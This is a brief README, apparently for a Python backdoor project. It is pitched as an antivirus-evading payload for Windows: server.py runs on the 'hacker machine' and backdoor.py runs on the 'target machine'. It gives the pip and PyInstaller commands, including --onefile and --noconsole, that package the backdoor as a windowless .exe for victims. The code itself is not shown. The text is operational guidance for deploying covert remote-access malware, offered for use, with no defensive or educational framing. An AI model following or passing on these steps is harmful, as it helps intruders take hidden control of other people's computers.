# Payload
No detectable pyload by antivirus for windows machines

the server.py should be compiled on hacker machine by this command :
pyhton3 server.py

the backdoor.py sould be executed on target machine.

Note :
to execute to backdoor.py you should tranform the file extensions from .py
to .exe (for windows machines)


How to transform extensions:
pyhton -m PyInstaller backdoor.py --onefile --noconsole


Requirements :
Installing the pyinstaller module by this command "pip install pyinstaller"
 
